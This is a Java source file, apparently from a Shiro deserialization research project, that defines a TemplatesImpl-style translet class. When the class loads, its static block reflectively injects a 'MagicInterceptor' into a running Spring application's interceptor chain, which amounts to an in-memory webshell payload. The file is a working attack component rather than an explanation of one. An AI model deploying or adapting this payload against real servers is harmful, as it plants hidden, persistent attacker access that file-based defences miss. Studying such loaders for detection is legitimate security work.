package com.shiro.vuln.SpringMemShell.Interceptor;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.ibatis.javassist.ClassPool;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

public class KoishiEvilInterceptor extends AbstractTranslet {
    static {
        try {
            WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());
//从requestMappingHandlerMapping中获取adaptedInterceptors属性 老版本是DefaultAnnotationHandlerMapping
            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(RequestMappingHandlerMapping.class);

            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>) field.get(abstractHandlerMapping);

            String className = "com.shiro.vuln.SpringMemShell.Interceptor.MagicInterceptor";
            //加载 MagicInterceptor类 的字节码
            byte[] bytes = ClassPool.getDefault().get(com.shiro.vuln.SpringMemShell.Interceptor.MagicInterceptor.class.getName()).toBytecode();
            java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            java.lang.reflect.Method m0 = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
            m0.setAccessible(true);

            m0.invoke(classLoader, className, bytes, 0, bytes.length);
            //添加 MagicInterceptor 类到adaptedInterceptors
            adaptedInterceptors.add(classLoader.loadClass(className).newInstance());

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

